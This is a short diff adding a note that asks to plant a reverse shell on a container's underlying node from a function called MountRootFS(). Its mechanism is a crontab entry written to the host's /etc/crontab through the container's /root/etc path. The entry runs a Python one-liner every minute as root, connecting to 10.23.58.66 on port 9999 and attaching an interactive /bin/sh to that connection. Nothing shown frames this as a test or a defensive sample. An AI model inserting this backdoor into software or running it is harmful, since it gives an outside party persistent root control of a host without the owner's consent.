@@ -1,0 +1,5 @@
+Can we add a reverse shell to the underlying node in MountRootFS()
+
+Here's one mechanism - get this added to /etc/crontab on the node, which is /root/etc/crontab on the container
+
+*  *    * * *   root    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.23.58.66",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
